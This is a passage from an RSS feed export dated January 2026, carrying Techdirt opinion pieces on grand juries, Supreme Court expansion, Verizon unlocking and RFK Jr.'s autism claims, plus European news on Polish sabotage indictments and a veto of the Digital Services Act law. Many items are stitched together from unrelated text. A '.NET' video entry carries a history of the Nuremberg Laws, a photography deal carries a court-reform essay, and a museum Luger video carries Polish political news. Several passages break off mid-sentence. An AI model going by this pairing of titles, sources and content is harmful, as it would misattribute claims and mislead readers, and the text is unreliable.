LIGHTS never fails to make him cry.]]></content:encoded></item><item><title>Welcome To The Resistance… Grand Juries?</title><link>https://www.techdirt.com/2026/01/16/welcome-to-the-resistance-grand-juries/</link><author>Tim Cushing</author><category>tech</category><pubDate>Fri, 16 Jan 2026 18:52:03 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[The DOJ can’t indict a ham sandwich these days. That old saying doesn’t ring as true as it used to now that most of the DOJ’s work is just vindictive prosecutions. It’s not just cases being tossed because DOJ prosecutors weren’t legally appointed to their positions. This dates back to the early parts of last year when the DOJ was trying to turn anti-ICE protesters into convicted felons. Most notoriously, the government failed to secure an assault indictment against Sean Dunn, a DC resident who famously “assaulted” an ICE officer by throwing a literal sandwich at them.Former Trump personal lawyer Lindsey Halligan did manage to secure indictments (after multiple attempts) against former FBI director James Comey and current New York Attorney General Letitia James. Those case are gone but not because the grand juries rebelled, but because the “rule of law” party ignored a lot of rules and laws.In 2016, the most recent year for which the Justice Department has published data, federal prosecutors concluded more than 155,000 prosecutions and declined over 25,000 cases presented by investigators. In only six instances was a grand jury’s refusal to indict listed as the reason for dropping the matter.Lindsey Halligan managed to rack up nearly half that amount in a single case:A grand jury rejected one of three charges Halligan proposed against Comey. She initially secured an indictment against James, but after a judge threw that case out , two grand juries voted down new indictments.She did this twice with the same proposed defendant. The DOJ surpassed this number of rejections less than halfway through 2025, as grand juries not only rejected the vindictive prosecution of the DC sandwich thrower, but dozens of other cases brought by prosecutors. At one point earlier this year, [DOJ US Attorney Bill] Essayli’s office had managed to secure indictments in less than a quarter of the felony cases it brought in connection with protests or immigration raids, the Los Angeles Times reported.We’ve spent plenty of time criticizing grand juries here at Techdirt. But something weird and quietly wonderful is happening all over the nation, which is returning grand juries back to their roots: a crucial part of the system of checks and balances. The Constitution requires that every federal felony be indicted by a grand jury. This safeguard was inherited from the British legal system, where it dates back to the Magna Carta in the 13th century. To prevent the king from arbitrarily locking up people for improper reasons, British law required the Crown to present its evidence to a panel of residents of the local community to establish that criminal charges were justified. The case could only proceed if that group of citizens, the grand jury, approved the charges.We’re dealing with a president who thinks he’s a king. And his DOJ is finding out that regular Americans not only don’t view him as a king, but aren’t willing to rubber stamp a bunch of vindictive prosecutions meant to remind citizens who’s in power. Halligan went 1-for-3 in her attempted prosecution of James Comey. Former Fox commentator Jeanine Pirro did even worse when trying to prosecute an anti-ICE protester for assault. Pirro’s office presented these facts to a D.C. federal grand jury and asked them to indict Reid for assaulting, resisting, or impeding a federal officer, a felony punishable by up to eight years in prison. When the grand jury refused, prosecutors tried again with a second grand jury. And then with a third. Each grand jury refused to return the indictment sought by prosecutors.Now that this sort of thing is almost a daily occurrence, Trump loyalists like Pirro are blaming their inability to secure indictments on the public, rather than their own inability to read the room and discard felony charges jury members don’t seem to believe are warranted. That’s part of the reason why so many indictments are returned by grand juries: prosecutors who actually know what they’re doing (rather than the stunt casting that passes for federal agency appointments under Trump) will ditch cases that seem doomed to be rejected by grand jurors.No one in the administration will learn anything from this. Bill Essayli will continue to scream at his underlings for failing to turn vindictive bullshit into prison sentences. Lindsey Halligan will continue to bumblefuck her way into an eventual firing for failing to fulfill Trump’s revenge fantasies. And other under-qualified former Fox b-listers will return to their former employer to complain their losses are just more evidence of a latent strain of liberalism that’s making America less great again.“There are a lot of people who sit on juries and and they live in Georgetown or in Northwest or in some of these better areas, and they don’t see the reality of crime that is occurring,” Pirro said in August on “Fox News Sunday.”Pirro also blamed that alleged indifference to crime for a grand jury’s refusal to indict Justice Department paralegal Sean Dunn for throwing a Subway sandwich at a Customs and Border Protection agent during a street confrontation earlier that month.“The grand jurors don’t take it so seriously. They’re like, ‘Eh, you know, whatever.’ My job is to try to turn that around,” Pirro said. Like many people in Trump’s orbit, Pirro is so divorced from reality she should be cutting it alimony checks every month. The grand juries are taking it seriously. It’s the DOJ prosecutors that are being glib, treating every ridiculous case like a foregone conclusion as they try to convert Trump’s desire for vengeance into criminal charges. Say what you will about grand juries, but it appears jurors aren’t willing to help the government strip people of their freedom just because it’s angry.]]></content:encoded></item><item><title>Daily Deal: The Complete Superstar Photographer Bundle</title><link>https://www.techdirt.com/2026/01/16/daily-deal-the-complete-superstar-photographer-bundle-2/</link><author>Daily Deal</author><category>tech</category><pubDate>Fri, 16 Jan 2026 18:48:00 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[The Complete Superstar Photographer Bundle has 11 courses to help take your photography skills to the next level.

Because right now, we have a system where individual judges matter way, way too much. Rather than the minor reforms and incremental changes some are suggesting, I think the solution is to go big. Really big. Expand the Supreme Court to at least 100 justices, with cases heard by randomized panels.I’ll explain the details below, but the core philosophy is simple: no single Supreme Court Justice should ever matter that much.President Trump has found a powerful but obscure bulwark in the appeals court judges he appointed during his first term. They have voted overwhelmingly in his favor when his administration’s actions have been challenged in court in his current term, a New York Times analysis of their 2025 records shows.Time and again, appellate judges chosen by Mr. Trump in his first term reversed rulings made by district court judges in his second, clearing the way for his policies and gradually eroding a perception early last year that the legal system was thwarting his efforts to amass presidential power.The actual figures are damning. Trump’s appellate appointees voted to allow his policies to take effect 133 times and voted against them only 12 times. That’s 92 percent of their votes in favor of the administration.When Chief Justice John Roberts responded to Trump’s criticism of an “Obama judge” back in 2018, he insisted that “we do not have Obama judges or Trump judges, Bush judges or Clinton judges.”The data suggests Roberts was either naive or lying.The Times analyzed every judicial ruling on Mr. Trump’s second-term agenda, from Jan. 20 to Dec. 31 of last year, or more than 500 orders issued across 900 cases. About half of rulings at the appellate level were in Mr. Trump’s favor — better than his performance with the district courts, though worse than his record at the Supreme Court, where the rulings on his agenda have almost all been on a preliminary basis in response to emergency applications.And there it is. The higher you go up the judicial food chain, the better Trump does. District courts ruled in his favor 25% of the time. Appeals courts: 51%. The Supreme Court: 88%.Now, some will argue this is the system working as designed—higher courts correcting overzealous lower court judges. And sure, that’s part of what appeals courts do. But the pattern here isn’t just about legal merit. It’s about how much individual judges matter, and how vulnerable the system is to ideological capture.The uniformity of the judges’ votes is reason for serious concern, said Mark L. Wolf, a former federal judge nominated by President Ronald Reagan. Judge Wolf recently retired so he could speak more freely about what he has characterized as the threat that Mr. Trump posed to the rule of law.“If you’re an impartial judge, the same party is not going to win every time,” he said. “Because the facts are different, the law is different, and so the result is often going to be different.”This gets at the fundamental problem. When you have a small number of judges with lifetime appointments, whose ideological leanings are known quantities, those individual judges become enormously powerful. A single justice retiring or dying at the wrong time can reshape American law for a generation. That’s insane. No single person should have that kind of power over the constitutional rights of 330 million people.And it gets worse. The Times found that three Trump appointees on the D.C. Circuit—Judges Gregory Katsas, Neomi Rao, and Justin Walker—accounted for more than half of all pro-Trump votes from Trump’s appellate appointees. Three judges. In one circuit. Exercising “outsized influence.”Combined, Judges Gregory G. Katsas, Neomi Rao, and Justin R. Walker voted 75 times in favor of the administration — slightly more than half of the pro-Trump votes from Mr. Trump’s appointees logged by the Times analysis — and only three times against.So what do we do about this?The typical response from Democrats when they’re in power is to either accept the status quo or propose modest reforms that don’t actually address the structural problem. Republicans, meanwhile, have been playing the long game on judicial appointments for , understanding that packing the courts with ideologically aligned young judges is one of the most effective ways to entrench their policy preferences beyond electoral accountability.We need to think bigger. Much bigger.Here’s my proposal: Expand the Supreme Court to , with cases heard by randomized panels of 9 justices. High-profile or particularly important cases could be reheard en banc by a larger panel or the entire court, similar to how it’s currently done in appeals courts.Before you dismiss this as just another “court packing” scheme, let me explain why it’s fundamentally different from what FDR tried to do in 1937.FDR’s plan was explicitly designed to shift the ideological balance of the court in his favor. He wanted to add up to six new justices precisely because the existing court kept striking down New Deal programs. The goal was partisan advantage, and everyone knew it. That’s why it failed—even FDR’s own party largely opposed it as a power grab.What I’m proposing is the opposite. By expanding to at least 100 justices, you’re not packing the court in any ideological direction. You’re diluting the power of any individual justice—or any ideological bloc—to the point where it doesn’t matter nearly as much who gets appointed or when they retire or die. And unlike some reform proposals that would require a constitutional amendment, this one doesn’t. The Constitution doesn’t specify the size of the Supreme Court—Congress has changed it before, from as few as five justices to as many as ten.Think about it this way: Right now, replacing one justice out of nine can shift the balance of the court from 5-4 one way to 5-4 the other way. That’s an enormous swing from a single personnel change. But if you have 100 justices, and cases are heard by randomized panels of 9, the ideological composition of any given panel becomes much more variable, and the overall composition of the court becomes much more stable over time.No single president appointing one or two or even ten justices can fundamentally reshape the court. No single justice dying at an inopportune moment can throw constitutional law into chaos. The incentive for presidents to appoint ideological extremists diminishes because no individual justice will be important enough to matter that much.This is the core principle: No single Supreme Court justice should ever be important enough to matter.We shouldn’t care who any individual justice is. We shouldn’t have national freakouts when an 87-year-old justice refuses to retire. We shouldn’t have presidents salivating over the actuarial tables of aging justices. The system should be robust enough to absorb personnel changes without lurching wildly in one direction or another.How would this work in practice? There are several possibilities.One approach would be to elevate existing appeals court judges to the Supreme Court. This could happen all at once or gradually over time. Given that there are currently around 180 active appeals court judges, drawing from this pool wouldn’t be difficult from a numbers perspective.Another approach would be a rotating system where appeals court judges serve temporary terms on the Supreme Court. This would actually align with how many other countries structure their highest courts and would create a more fluid relationship between the appellate and Supreme Court levels.Either approach could be combined with term limits—say, 18 years—for Supreme Court justices. Term limits address a different but related problem: the arbitrary power that comes from lifetime appointments combined with advances in life expectancy. When the Constitution was written, justices served an average of about 15 years. Now they routinely serve 25, 30, or more. Term limits would make appointments more predictable and reduce the incentive for presidents to appoint the youngest possible ideologues who might serve for four decades.There are additional benefits to this approach beyond diluting individual power.First, the Supreme Court could actually hear more cases. The court has been steadily shrinking its docket for decades, from around 150 cases per year in the 1980s to around 60-70 today. With multiple panels operating simultaneously, the court could address far more legal questions, reducing the enormous backlog of important issues that never get resolved.Second, it could help rationalize the federal circuit system. The Ninth Circuit, for example, is a behemoth that covers nine states plus Guam and the Northern Mariana Islands, with more than twice as many judges as the smallest circuits. With a reorganized Supreme Court drawing from an expanded pool of appellate judges, there would be an opportunity to realign the circuits into more sensible and equally-sized units.Third, randomized panels would undermine the strategic timing that currently shapes which cases reach the court and when. Right now, advocacy groups wait for favorable court compositions before pushing major cases. The Dobbs decision that overturned Roe v. Wade didn’t happen by accident in 2022—anti-abortion activists had been deliberately holding back their most aggressive challenges for years, waiting until they knew they had a 6-3 anti-abortion majority locked in. With randomized panels drawn from 100 justices, that kind of strategic patience becomes pointless. You can’t game a court composition you can’t predict.Now, there are legitimate questions and criticisms of this approach.Some will argue that a 100-justice court would produce inconsistent rulings—different panels reaching different conclusions on similar issues. This is a real concern, but it’s manageable. En banc review could resolve circuit splits and ensure consistency on the most important questions. And frankly, we already have inconsistency—different circuit courts regularly reach contradictory conclusions that take years to resolve. Also the Supreme Court’s composition continually changes over time, and we still accept the results from different panels. No one sees a problem with relying on cases from half a century ago even though none of the Justices who made those rulings is even alive, let alone on the court, any more.The most serious objection is political: any expansion would be seen as partisan court packing regardless of intent. This is true. Republicans would scream bloody murder if Democrats expanded the court by 91 justices, no matter how the new seats were filled. But Republicans are already screaming bloody murder about the courts whenever they don’t get their way. The question isn’t whether a reform will be controversial. The question is whether it will actually fix the problem.The status quo isn’t neutral. A system where individual justices wield enormous power is a system that advantages whoever is best at the long game of judicial appointments. For the past several decades, that’s been Republicans.Refusing to change a broken system because change might be controversial is just accepting permanent disadvantage while pretending to take the high road. Indeed, for anyone who (falsely) claims that this plan is “packing the court” (a la FDR), it’s the opposite. The Republicans and the Federalist Society spent decades plotting out things to get us where we are today, with a court that is “packed” in favor of their interests.This is about unpacking the court.The data from the Times analysis should alarm everyone who cares about an independent judiciary. When 92 percent of a president’s judicial appointees vote in his favor, that’s not impartial justice. That’s a rubber stamp. And when that pattern intensifies the higher you go in the judicial system, culminating in an 88% success rate at the Supreme Court, you have a system that’s been captured.The solution isn’t to try to capture it for the other side. The solution is to build a system that’s resistant to capture in the first place.Make the Supreme Court so large that no president can pack it. Make individual justices so interchangeable that none of them become celebrities or villains. Make the system boring. Make it work.Because right now, we have a Supreme Court where everyone knows exactly who the swing vote is, where entire advocacy organizations are built around influencing specific justices, where presidential elections are decided partly on who might die in the next four years.That’s not how a functional judicial system in a modern democracy should work. It’s time to unpack the court.]]></content:encoded></item><item><title>Behind the Blog: Putting the Puzzle Together</title><link>https://www.404media.co/behind-the-blog-putting-the-puzzle-together/</link><author>Samantha Cole</author><category>tech</category><enclosure url="https://www.404media.co/content/images/2026/01/nl116-1.png" length="" type=""/><pubDate>Fri, 16 Jan 2026 17:17:14 +0000</pubDate><source url="https://www.404media.co/">404</source><content:encoded><![CDATA[This is Behind the Blog, where we share our behind-the-scenes thoughts about how a few of our top stories of the week came together.

In my career it’s been sort of weird for me to focus on one company or one thing so much for so long. I tend to get a little restless about the topics I cover, and there can sometimes be a very real fatigue with specific types of stories. After a while, people “get it,” and so the bar for a new story on a topic keeps going up. I wish this weren’t the case, and we try to cover things we feel are important, but if you’re writing about a topic and no one is reading it, then the audience might be telling you they don’t find that thing interesting anymore. This has not yet been the case with Flock, somewhat to my surprise. I’ve been writing about surveillance technologies for a long time, and it’s rare for a specific company or specific type of technology to hold people’s interest and attention for too long. ]]></content:encoded></item><item><title>.NET in 100 Seconds</title><link>https://www.youtube.com/watch?v=MFsYaRnrcPQ</link><author>Fireship</author><category>yt</category><enclosure url="https://www.youtube.com/v/MFsYaRnrcPQ?version=3" length="" type=""/><pubDate>Fri, 16 Jan 2026 17:03:35 +0000</pubDate><source url="https://www.youtube.com/channel/UCsBjURrPoezykLs9EqgamOA">Fireship</source><content:encoded><![CDATA[.NET is a free and open-source platform for creating high-performance software in virtually every domain, powered primarily by the C# programming language.

Announced on September 15 at the annual Nazi Party rally in Nuremberg, these laws were presented as protecting "German blood and honor." They consisted of two main decrees: the Reich Citizenship Law and the Law for the Protection of German Blood and German Honor.

The Reich Citizenship Law redefined citizenship, distinguishing between "Reich citizens" (those of "German or related blood" with full political rights) and mere "subjects" of the state. Jews were classified as non-citizens, stripping them of voting rights, public office eligibility, and other civic protections. It used a pseudoscientific racial criterion: anyone with three or four Jewish grandparents was deemed fully Jewish, regardless of religious practice. Even those with fewer Jewish ancestors ("Mischlinge") faced restrictions.

The second law banned marriages and extramarital relations between Jews and "Aryans," prohibiting Jews from employing German women under 45 in their homes and from displaying the German flag. These measures aimed to isolate Jews socially and economically, promoting the Nazi ideology of racial purity.

The Nuremberg Laws intensified existing boycotts and violence, such as the 1933 anti-Jewish campaigns. They were enforced through supplemental decrees, like mandatory yellow stars for identification. By 1938, they fueled events like Kristallnacht, escalating to mass deportations and genocide. Internationally, the laws drew condemnation but little intervention, emboldening Hitler.

Historians view them as a turning point from discrimination to systematic extermination, affecting over 400,000 German Jews and extending to occupied territories. Post-WWII Nuremberg Trials held Nazi leaders accountable, using these laws as evidence of crimes against humanity. Today, they serve as a stark reminder of how legal systems can enable hatred, underscoring the importance of human rights protections.]]></content:encoded></item><item><title>My son was killed - A mother&apos;s journey through grief | DW Documentary</title><link>https://www.youtube.com/watch?v=36WcDbvRKtE</link><author>DW Documentary</author><category>yt</category><enclosure url="https://www.youtube.com/v/36WcDbvRKtE?version=3" length="" type=""/><pubDate>Fri, 16 Jan 2026 17:00:06 +0000</pubDate><source url="https://www.youtube.com/channel/UCW39zufHfsuGgpLviKh297Q">DW Documentary</source><content:encoded><![CDATA[In June 2024, Joanna lost her 20-year-old son Philipos. He was beaten up by another young man, following his sister's high school graduation party. Two days later, he died. The alleged perpetrator, a 19-year-old Syrian, was arrested.

A summer evening that ended in disaster. After his sister's high school graduation party, 20-year-old Philipos was brutally attacked in the German town of Bad Oeynhausen.

As his mother Joanna was mourning her son, Philipos became headline news. Before long, his death was used to reignite the debate on Germany’s asylum policy. Both in the German parliament, and in the media. 

Philipos' mother did not participate in this discussion. For her, the nationality of the perpetrator was irrelevant. "The doctor who fought for my child's life is Syrian," she said. "So is my hairdresser. And me? I'm Polish.”

Instead, Joanna, who is deeply religious, tried to find a way to deal with her anger, rage, despair, and grief. She sought advice from a prison psychologist and a priest: Why did Philipos have to die? Am I allowed to be angry with the perpetrator? Do I have to forgive him?

She sat opposite the defendant at the Bielefeld Regional Court, endured the police reports and witness statements, listened to the autopsy results from the forensic pathologists, and witnessed the images of her dead child on the dissection table.

"Even hearing the incomprehensible, the painful, knowing how Philipos died... I owe that to my child," she said.

During an earnings call, CEO C.C. Wei told investors that while he cannot predict the semiconductor industry's long-term trajectory, he remains bullish on AI.TSMC manufactures chips for companies including Apple, Nvidia, AMD, and Qualcomm, making it a linchpin of the global electronics supply chain. The company produces the vast majority of the world's most advanced semiconductors, and its factories in Taiwan have become a focal point of US-China tensions over technology and trade. When TSMC reports strong demand and ramps up spending, it signals that the companies designing AI chips expect years of continued growth."All in all, I believe in my point of view, the AI is real—not only real, it's starting to grow into our daily life. And we believe that is kind of—we call it AI megatrend, we certainly would believe that," Wei said during the call. "So another question is 'can the semiconductor industry be good for three, four, five years in a row?' I'll tell you the truth, I don't know. But I look at the AI, it looks like it's going to be like an endless—I mean, that for many years to come."]]></content:encoded></item><item><title>A First World War Luger and the Personal Items of a Major with Firearms Curator Lisa Traynor</title><link>https://www.youtube.com/watch?v=0Fvwk6DQ4fw</link><author>Royal Armouries</author><category>yt</category><enclosure url="https://www.youtube.com/v/0Fvwk6DQ4fw?version=3" length="" type=""/><pubDate>Fri, 16 Jan 2026 16:15:00 +0000</pubDate><source url="https://www.youtube.com/channel/UCsMX-XuiEkBi4-GDrYuniWg">Royal Armouries</source><content:encoded><![CDATA[A Luger with a story: Firearms Curator, Lisa Traynor, tells the story of this WWI Luger and the associated items of Major Charles Frederick Ashdown.

We cannot do what we do without your support.Polish prosecutors have indicted five people – four Ukrainian citizens and one Russian – with carrying out sabotage on behalf of Russia that involved planting explosives in packages that were then dispatched by courier services across Europe.Three of the items exploded: one at Birmingham Airport in the United Kingdom, one at Leipzig Airport in Germany, and another while being transported on a Polish road. The group also sent test packages to the United States and Canada to check those routes.Poland’s investigation into the alleged plot began in August 2024, based on information gathered by the Internal Security Agency (ABW).Prosecutors established that, between June and August, the suspects sent four parcels containing incendiary devices along with flammable and explosive substances hidden within everyday items, such as massage pillows and cosmetics.The items were then sent through courier companies DHL and DPD from Vilnius in Lithuania to addresses in Warsaw, Poland, as well as London and Birmingham in the United Kingdom.In July 2024, three of the packages combusted: one at a DHL warehouse in Birmingham Airport, one in a DHL container at Leipzig Airport (where it was on its way to London), and one in a lorry while it was being transported on a Polish road. The fourth package “did not ignite for technical reasons”, say prosecutors.The group also sent two “test shipments” from Warsaw to the United States and Canada “in order to check logistics channels and the time required for international shipment transportation, particularly by air”.“They also noted that the cost of the damage caused by their actions is estimated at 2.9 million zloty (€690,000).On Friday, Poland’s National Prosecutor’s Office announced that five individuals have been indicted over their alleged involvement in the plot. Under Polish privacy law, they can be named only as Vladyslav D., Viacheslav C., Vladyslav B. and Serhii Y. – all Ukrainian citizens – and Aleksandr B., a Russian.All have been charged with preparing and committing acts of sabotage of a terrorist nature on behalf of foreign intelligence, in this case Russian intelligence. The accused, who have all been placed in pretrial detention, could face life imprisonment if found guilty.The evidence gathered by prosecutors has also led them to want to bring charges against a sixth individual, also Russian, named as YCorrection: an earlier version of this article said that the five individuals had been charged with sabotage. In fact, they were indicted. The text has been corrected to acknowledge this.

We cannot do what we do without your support.Poland’s deputy prime minister has hit back at the US ambassador for praising opposition-aligned President Karol Nawrocki’s decision to veto a bill introducing tougher controls over online content.Ambassador Thomas Rose described the proposed measures, which could have been used against big tech firms, as “anti-American” and hailed President Karol Nawrocki’s decision to block them as a defence of freedom and innovation.However, Krzysztof Gawkowski, who serves as both deputy prime minister and minister of digital affairs, said that Rose is “mistaken” in his views. Earlier this week, Gawkowski also hit back at Elon Musk after the billionairre praised Nawrocki’s veto.The bill in question aimed to implement the European Union’s Digital Services Act (DSA) in Poland. The government said that it would help protect internet users from harmful and illegal content, as well as disinformation.However, last week it was vetoed by Nawrocki, who is aligned with the right-wing opposition and has regularly clashed with the more liberal government. The president argued that the measures would have threatened free speech in a manner “reminiscent of the Ministry of Truth in Orwell’s On Wednesday, Nawrocki’s decision was praised by Rose, who wrote on social media that the Polish president “deserves great credit” for vetoing “anti-American” measures that “would have weakened Poland in so many ways”“It would stifle innovation, punish achievement, create massive barriers for new market entrants and make it almost impossible for Polish companies to scale,” wrote Rose. “It would strip capital from Polish innovation and give it Brussels bureaucrats, lawyers and audits, and replace clear rules with regulatory discretion.”On Thursday, Gawkowski hit back, telling the ambassador that the proposed law “has nothing to do with stifling innovation or ‘punishing America'”. Rather, it is about “protecting Polish citizens from illegal content, scams, and hate directed at children and youth”.“Freedom without responsibility is not sovereignty; it is powerlessness,” wrote Gawkowski. “And a strong state protects its society; it does not relinquish that protection in the name of corporate interests. Not even those from the country of our most important ally.”Poland’s foreign minister, Radosław Sikorski, also weighed in on Rose’s comments, using them to suggest that the loyalties of Nawrocki, a close Trump ally, do not lie with Poland.The president’s slogan “was supposed to be Poland first”, wrote Sikorski, “but let’s appreciate the loyalty of the president to his sponsors.” The foreign minister noted that Nawrocki issued a veto benefiting crypto-markets, and now one benefiting big tech firms.Nawrocki’s decision to veto the implementation of the DSA in Poland has also been welcomed by many US right-wing figures, including Elon Musk. Gawkowski earlier this week hit back at Musk’s celebration of the veto.“We should be protecting our citizens from the digital sewage, not defending the interests of those who pump it out on an industrial scale,” wrote the Polish minister.“Congrats to everyone who values the platforms’ toxic ‘freedom’ more than the safety of their own society.”On Wednesday, deputy digital affairs minister Dariusz Standerski told broadcaster Polsat that the government has not given up on efforts to implement the DSA.He suggested that, instead of passing it as a single bill, the legislation could be broken up into parts, with each introduced individually. He added that the ministry was open to dialogue with Nawrocki.This week is not the first time Rose has clashed with Gawkowski. Last year, after he had been nominated as ambassador but before he had taken up his post, Rose criticised a planned tax on big tech firms being prepared by Gawkowski, calling it “not very smart” and warning it would harm relations with the US.

And as usual with the pay-to-play Trump administration, the Trump FCC is tripping over itself to give Verizon what it wants.“[The rule] required one wireless carrier to unlock their handsets well earlier than standard industry practice, thus creating an incentive for bad actors to steal those handsets for purposes of carrying out fraud and other illegal acts.”This is, you’ll be surprised to learn, a lie.Older folks might remember that Verizon used to be on this subject of consumer freedom. Once upon a time, the company banned you from even using third-party apps (including basics like GPS), forcing you to use extremely shitty Verizon apps. It also used to be horrendous when it came to unlocking phones, switching carriers, and using the device of your choice on the Verizon network.Two things changed that. One, back in 2008 when the company acquired spectrum that came with requirements that users be allowed to use the devices of their choice. And two, as part of merger conditions affixed to its 2021 acquisition of Tracfone. Thanks to those two events Verizon was dragged, kicking and screaming, into a new era of openness that was of huge benefit to the public.Here you have both a major wireless company and U.S. regulators lying to your face, insisting that killing these basic protections help create a “uniform industry standard that can help stem the flow of handsets into the black market.”Verizon used to sell phones that were already fully unlocked, but received a waiver from the first Trump administration in 2019 after the company again lied about how making it easier to switch carriers would make it harder to “prevent fraud.”Ultimately, what Verizon (and its friends at the corrupt FCC) want is zero government oversight whatsoever, taking us back to the days when Verizon could impose any number of obnoxious restrictions designed to harm (device and app) competition and the public interest. They want to bring back the era where you were locked to one provider via locked phones and long-term contracts. Given enough time and rope, they’ll inevitably push to be able to control what apps and services you can use (read: net neutrality). This desire to exploit telecom monopoly power operates a bit like the physics of running water; it only really goes one direction without functional government oversight. Because U.S. journalism is a clown show, many outlets are taking Verizon and the FCC’s unsubstantiated claims of increased fraud and parroting them in headlines, like Reuters does here:In exchange, Verizon obediently acquiesces to administration demands that executives remain quiet while the administration destroys democracy and civil rights, and occasionally makes an effort to try to be more sexist and racist. So far that corrupt symbiosis is working out well for both parties. ]]></content:encoded></item><item><title>Modern X86 Assembly Language Programming • Daniel Kusswurm &amp; Matt Godbolt</title><link>https://www.youtube.com/watch?v=1GfPBqyGWmw</link><author>GOTO Conferences</author><category>yt</category><enclosure url="https://www.youtube.com/v/1GfPBqyGWmw?version=3" length="" type=""/><pubDate>Fri, 16 Jan 2026 13:24:03 +0000</pubDate><source url="https://www.youtube.com/channel/UCs_tLP3AiwYKwdUHpltJPuA">GOTO Conferences</source><content:encoded><![CDATA[This interview was recorded for the GOTO Book Club.

We cannot do what we do without your support.Russia has advised its citizens against travelling to Poland because of “Russophobic sentiments” and “persecution of Russian citizens”.On Tuesday, the Russian embassy in Warsaw issued a “warning for Russian citizens planning trips to Poland”, saying that, “under current circumstances, [we] strongly recommend that“The Kremlin has regularly accused Poles of harbouring hatred towards Russians. Last year, a state-backed exhibition titled “Ten Centuries of Polish Russophobia” opened in Moscow.Poles do indeed have overwhelmingly negative views of Russia. However, that is in large part based on a history in which Russia has invaded, occupied and ruled over Polish territory, including, most recently, decades of Moscow-imposed communist rule.The embassy added that there is a particular risk for Russians who have previously “travelled to new regions of Russia” – a reference to Russian-occupied parts of Ukraine. Such visits “could be interpreted as illegal by Polish authorities at Ukraine’s request”.That is likely a reference to the detention in Warsaw last month of a Russian archaeologist from the renowned Hermitage Museum in Saint Petersburg. He was arrested at the request of Ukraine, which accuses him of conducting illegal excavations in occupied Crimea.Earlier this week, Moscow summoned the Polish ambassador to issue a protest against his detention and to demand his release. A Polish court is due soon to decide on whether to extradite the suspect to Ukraine.Russians are already banned from entering Poland in most cases, even if they possess a Schengen visa. Exceptions include humanitarian reasons – for example, opposition figures fleeing Russia – and diplomatic or other official visits.Earlier this month, Poland refused to allow two Russian ski jumpers to participate in a World Cup event in the town of Zakopane, despite them being cleared to compete by the Court of Arbitration for Sport.Poland was also removed as the host of two European junior weightlifting championships this year due to its refusal to allow athletes from Russia and Belarus to take part.Diplomatic tensions between Russia and Poland have been at a heightened level in recent years. Since Russia’s full-scale invasion of Ukraine, Poland has been one of Kyiv’s closest allies and has demanded tougher international action against Moscow.

In 218 BCE, the Second Punic War began between the two powers, with the Carthaginian army led by a man named Hannibal Barca. Famously, Hannibal took his forces – including a contingent of war elephants – over the Alps and into Italy, finally marching on Rome itself. But eventually the Carthaginians were beaten back, and Hannibal ended his days in exile. In this episode we explore his epic life, from his childhood in Spain, to his tactical brilliance as a general, to his post-war career as a reformist politician.This is a radio edit of the original podcast episode.

To call Kennedy an anti-vaxxer is not remotely controversial any longer, and probably never was. To state that he’s a corrupt peddler of misinformation from which he has, likely still is, and will in the future profit should be equally uncontroversial. And if there is a single health issue on which Kennedy has staked his dubious claims more than any other, it certainly must be autism spectrum disorder.Kennedy, and Trump right alongside him, have been all over the map when it comes to his claims about autism. Kennedy was one of those leading the charge for decades in claiming that thimerosal in childhood vaccines was responsible for rising rates in autism diagnoses. When thimerosal was removed from most childhood vaccines over two decades ago and autism rates didn’t decrease, rather than admitting they were wrong, Kennedy and his cadre of hapless buffoons simply pivoted to another vaccine ingredient: aluminum. That ingredient has also been deemed safe by countless studies and experts. You know, people who actually know what the hell they’re talking about.Since then, Kennedy has discovered all sorts of other causes of the disorder. Male circumcision? Autism! Make American girthy again, I suppose. Use of Tylenol by pregnant women and/or for young children? Autism! Fevers are super hot these days, y’all. And, of course, he is still claiming it might be vaccines too, because why the hell not? It’s not like measles is everywhere or anything.Kennedy’s alteration of the CDC page on vaccines and autism to suggest that there just might be a link between the two is particularly appropriate, as the FDA just also disappeared a webpage informing the public on the various snake oil style scams that are out there purporting to treat autism as well.…under anti-vaccine Health Secretary Robert F. Kennedy Jr.—who has numerous ties to the wellness industry—that FDA information webpage is now gone. It was quietly deleted at the end of last year, the Department of Health and Human Services confirmed to Ars Technica.The defunct webpage, titled “Be Aware of Potentially Dangerous Products and Therapies that Claim to Treat Autism,” provided parents and other consumers with an overview of the problem. It began with a short description of autism and some evidence-based, FDA-approved medications that can help manage autism symptoms. Then, the regulatory agency provided a list of some false claims and unproven, potentially dangerous treatments it had been working to combat. “Some of these so-called therapies carry significant health risks,” the FDA wrote.The list included chelation and hyperbaric oxygen therapy, treatments that those in the anti-vaccine and wellness spheres have championed.It should be obvious already that there is no evidence to suggest that these so-called autism therapies work in any way, shape, or form. That’s why the FDA had a page up warning against their use. In some cases, the danger in using them is no joke either.Hyperbaric oxygen chamber use is probably the lesser of the two concerns. They won’t do anything for your autism, but they are typically found in facilities with staff who aren’t medical professionals and aren’t always trained well in their use generally. That’s how one five year old (!!!) that visited a wellness center that claimed to treat autism with hyperbaric chambers was incinerated inside it when a spark went off and all of that concentrated oxygen ignited. On the one hand, this person certainly doesn’t have autism any longer, though I don’t think that’s how the result is supposed to be achieved.Then there’s chelation therapy, a process by which chemical injections into the body are performed, so that these chemicals can bind to metals within a person’s bloodstream, allowing them to be excreted through waste. Chelation actually  have legitimate uses, such as when someone has heavy metal poisoning, typically from mercury, lead, or arsenic. Using chelation therarpy to remove non-approved minerals, however, can have negative health outcomes, including death. And, of course, one of Kennedy’s minions is David Geier. Geier is an anti-vaxxer who joined HHS to “find” the cause of autism and has long been advocate for chelation therapy.To address this nonexistent problem, anti-vaccine activists have touted chelation as a way to remove metals delivered via vaccines and treat autism. One of the most notorious of these activists is David Geier, whom Kennedy hired to the US health department last year to study the debunked connection between vaccines and autism. David Geier, along with his late father, Mark Geier, faced discipline from the Maryland State Board of Physicians in 2011 for, among other things, putting the health of autistic children at risk by treating them with unproven and dangerous hormone and chelation therapies. Mark Geier was stripped of his medical license. David Geier, who is not a scientist or doctor, was issued a civil fine for practicing medicine without a license.So why is all of this being done? Money, of course! Kennedy has surrounded himself with these “health guru” snakeoil salesmen, both in government and out, and the lot of them have made buckets and buckets of money doing this sort of thing.Generally, my experience is that people think RFK Jr. is one of two things. One common belief is that he’s a health savior, finally sticking it to a corrupt medical industry and telling the truth about the real causes of real disorders like autism. That’s incredibly wrong for a million different reasons. The other common belief is that Kennedy’s views on vaccines and health are super wrong, and that he’s very dumb, but also that he’s a true believer.That’s wrong, too. This is a grift and always has been. A money-making scheme built on the backs of illness and death for those who listen to him, all 